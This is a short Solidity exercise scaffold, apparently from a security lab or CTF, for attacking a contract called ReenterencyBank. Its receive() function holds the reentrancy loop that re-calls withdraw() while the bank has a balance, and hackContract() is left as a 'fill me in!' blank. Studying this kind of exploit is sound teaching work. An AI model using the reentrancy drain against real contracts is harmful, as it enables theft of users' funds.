// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./ReenterencyBank.sol";

contract HackReenterencyBank {
    ReenterencyBank reenterencyBank;

    constructor(address payable _bankAddress) payable {
        reenterencyBank = ReenterencyBank(_bankAddress);
    }

    function hackContract() external {
        // fill me in!
    }

    receive() external payable {
        if (address(reenterencyBank).balance > 0) {
            reenterencyBank.withdraw();
        }
    }
}
